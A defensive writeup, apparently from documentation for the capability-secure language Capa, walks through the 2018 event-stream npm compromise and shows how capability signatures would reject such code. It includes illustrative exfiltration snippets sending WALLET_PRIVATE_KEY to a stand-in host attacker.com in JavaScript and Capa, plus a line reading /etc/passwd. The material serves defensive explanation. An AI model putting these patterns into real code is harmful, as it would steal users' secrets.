# Capa would have caught: the event-stream incident

A concrete walkthrough of how Capa's capability discipline structurally
prevents the class of supply-chain attack that hit the npm package
`event-stream` in November 2018.

> The full runnable Capa side of this writeup is in
> [`examples/demo_event_stream.capa`](../examples/demo_event_stream.capa).

---

## What happened

`event-stream` was, at the time, a popular Node.js library for working
with streams. About 2 million weekly downloads. The original
maintainer ([Dominic Tarr][dt]) had no time to maintain it any longer,
and accepted help from a contributor named "right9ctrl" who had been
filing useful PRs. He gave them publish access.

In late 2018 right9ctrl shipped `event-stream@3.3.6`, which added a
new transitive dependency: `flatmap-stream@0.1.1`. That tiny new
dependency contained obfuscated code that:

1. Inspected the host process for indicators that it was running
   inside the **Copay** Bitcoin wallet app.
2. If detected, decoded an AES-encrypted payload using the host
   bundle as the key.
3. Made HTTPS requests to a server controlled by the attacker,
   exfiltrating wallet keys and seed phrases.

The malicious code was inert in any environment except Copay's. The
npm audit at the time was effectively "yes, event-stream is a stream
library; this looks harmless". The compromise was discovered by
[Ayrton Sparling][as] on November 26, 2018 and disclosed in
[event-stream#116][issue].

Primary sources:

- [event-stream#116 disclosure thread][issue]
- [Sparling's writeup][as-writeup]
- Multiple post-mortems (Snyk, npm Inc., The Register, Ars Technica)

[dt]: https://github.com/dominictarr
[as]: https://github.com/FallingSnow
[issue]: https://github.com/dominictarr/event-stream/issues/116
[as-writeup]: https://gist.github.com/FallingSnow/96f2e0f8aaa1ea9b58a2cdce9c6d76dd

---

## The anatomy of the attack

What enabled it, technically, was **ambient authority**. In JavaScript
(and Python, and Java, and Go, and almost every mainstream language),
any code that runs has the same baseline access as any other code in
the process:

- It can read environment variables (`process.env.WALLET_KEY`)
- It can open network sockets (`fetch('https://attacker.com')`)
- It can read arbitrary files (`fs.readFileSync('/etc/passwd')`)
- It can spawn processes (`child_process.exec(...)`)

The function exported by event-stream was nominally `(stream) => stream`
- a pure transformation of byte chunks. But the *language* could not
hold the implementation to that contract. There was no syntactic or
semantic difference between a `flat_map` that just transformed data
and a `flat_map` that also opened a socket to a server in another
country.

The auditor reading the package's README saw "stream library".
The auditor reading the package's source saw a few hundred lines of
plausible stream code, plus an inscrutable obfuscated blob in a
dependency. The auditor reading the *signatures* of the functions saw
nothing useful, because the signatures said nothing about what the
code was allowed to do.

---

## The Capa version

Here is the same `flat_map` operation written in Capa
([demo_event_stream.capa](../examples/demo_event_stream.capa)):

```capa
fun flat_map(lines: List<String>, f: Fun(String) -> List<String>) -> List<String>
    let result: List<String> = []
    for line in lines
        for out in f(line)
            result.push(out)
    return result
```

Run it:

```bash
$ capa --run examples/demo_event_stream.capa
flat_map produced 9 words from 2 lines
first word: Some(the)
last word:  Some(dog)
```

The relevant fact is not in the body, it is in the **signature**.
The function takes a `List<String>` and a function, and returns a
`List<String>`. There is **no** `Net` parameter, **no** `Fs`, **no**
`Env`, **no** `Stdio`, **no** `Unsafe`. None of those names is in
scope inside the function body. The compiler will reject any attempt
to use them.

## What an attacker would try

The malicious version in JavaScript was, in essence:

```js
function flatMap(input, f) {
    // ... pretend to transform input ...
    fetch('https://attacker.com', {
        method: 'POST',
        body: process.env.WALLET_PRIVATE_KEY,
    });
    // ...continue transforming...
}
```

The Capa version of that addition would look like this:

```capa
fun flat_map(lines: List<String>, f: Fun(String) -> List<String>) -> List<String>
    // === Attack attempt: exfiltrate environment to a remote server. ===
    let key = env.get("WALLET_PRIVATE_KEY")
    let _ = net.get("https://attacker.com?k=${key}")
    // === Continue with the legitimate transformation. ===
    let result: List<String> = []
    for line in lines
        for out in f(line)
            result.push(out)
    return result
```

And here is what the analyzer says when you try to compile it:

```
error: undefined name 'env'
   3 |     let key = env.get("WALLET_PRIVATE_KEY")
                     ^

error: undefined name 'net'
   4 |     let _ = net.get("https://attacker.com?k=${key}")
                   ^
```

There is no escape hatch. The function has no `env` and no `net` because
its signature did not request them. To make the attack go through,
the attacker would have to:

```capa
fun flat_map(env: Env, net: Net, lines: List<String>, f: Fun(String) -> List<String>) -> List<String>
    // now compiles, but...
```

…and **every caller of `flat_map`**, the entire npm ecosystem
downstream, would now have to thread an `Env` and a `Net` into a
function that previously did not need them. That change is loud. It
appears in pull requests, in code review, in dependency upgrade
diffs, in SBOM analyses, in static-analysis tooling. It is exactly the
kind of signal that an auditor, human or automated, can act on.

That is the entire point of the capability discipline: not that any
particular line of malicious code becomes impossible to write, but
that the *attempt* is forced into a place where it cannot hide.

---

## Why this matters, beyond one incident

The event-stream class of attack is not rare. Comparable supply-chain
incidents include:

- **ua-parser-js (2021)**, popular npm parser, account hijacked,
  payload mined cryptocurrency and stole credentials.
- **node-ipc (2022)**, maintainer added code that wiped files on
  systems geolocated to Russia and Belarus.
- **PyTorch nightly torchtriton (2022)**, typosquat that exfiltrated
  hostnames, environment variables, and SSH keys.
- **xz-utils (CVE-2024-3094, 2024)**, multi-stage backdoor in a
  compression utility, would have compromised SSH on every system
  using systemd.

Each of these relied on **ambient authority** as the enabling
condition. The malicious code lived inside a library that had no
business doing what it was doing, but the language gave it permission
by default.

For organisations that have to comply with the **EU Cyber Resilience
Act** (in force from December 2027), this is not a hypothetical
problem. The CRA requires manufacturers of products with digital
elements to maintain a Software Bill of Materials and to respond to
exploited vulnerabilities in any component. The harder question, which
component is allowed to do what, has no good answer in ambient-authority
languages today. It has a good answer in Capa: read the signatures.

---

## What Capa does *not* solve

To be honest about the limits:

- **A capability holder with bad intent is still dangerous.** If a
  library legitimately needs `Net`, and the maintainer ships a
  malicious version, the language cannot tell the difference between
  a legitimate request and a malicious one. The discipline narrows
  *where* attacks can hide; it does not eliminate trust entirely.
- **Capability attenuation reduces this risk further.** A function
  that needs to talk to `api.example.com` should be passed
  `net.restrict_to("api.example.com")`, not the full `Net`. See
  [`examples/net_attenuation.capa`](../examples/net_attenuation.capa).
- **The Python interop boundary (`py_import` / `py_invoke`) is still
  a risk.** Anything that crosses into Python loses Capa's
  guarantees. That boundary is gated by the `Unsafe` capability so
  it is explicit, but the loss is real. See
  [`examples/python_interop.capa`](../examples/python_interop.capa).
- **Capa is not a sandbox.** A determined attacker who already has
  process-level access can do things the language cannot prevent
  (read raw memory, modify the interpreter, etc). Capa raises the
  bar at the *source* level, where most supply-chain attacks live.

---

## Run it yourself

```bash
# The safe version (compiles and runs):
capa --run examples/demo_event_stream.capa

# The attack version (rejected by the analyzer): copy the malicious
# `flat_map` from above into a file, run --check, observe the errors.
```
